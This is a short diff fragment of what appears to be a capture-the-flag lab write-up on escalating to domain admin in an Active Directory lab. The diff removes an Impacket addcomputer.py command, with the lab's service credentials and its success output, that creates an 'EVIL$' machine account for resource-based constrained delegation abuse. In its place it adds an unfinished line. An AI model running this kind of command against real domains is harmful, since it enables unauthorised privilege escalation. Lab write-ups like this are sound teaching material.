@@ -408,11 +408,5 @@ C:\Windows\system32>
 Now i have a shell
 
 # Domain admin
-```python
-addcomputer.py -method LDAPS -computer-name 'EVIL$' -computer-pass 'Password123!' -dc-host brunodc.bruno.vl 'bruno.vl/svc_scan:Sunshine1'
-Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Successfully added machine account EVIL$ with password Password123!.
-```
-Ive added a computer account to abuse RBCD
+First ill grabn 
 
